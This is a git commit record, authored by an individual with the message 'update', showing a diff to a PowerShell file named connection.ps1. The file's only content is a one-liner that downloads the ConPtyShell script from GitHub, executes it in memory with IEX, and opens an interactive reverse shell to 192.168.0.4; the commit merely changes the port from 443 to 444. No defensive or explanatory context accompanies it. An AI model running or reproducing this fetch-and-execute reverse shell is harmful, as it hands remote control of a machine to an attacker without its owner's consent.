1d48686495e96fc61649aae7c7460abb62bae8f1
AndresFelipeGualdron <gualdronsito@hotmail.com>
2021-08-19 18:21:36 -0500

    update

--- connection.ps1
+++ connection.ps1
@@ -1,1 +1,1 @@
-IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.0.4 443
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.0.4 444
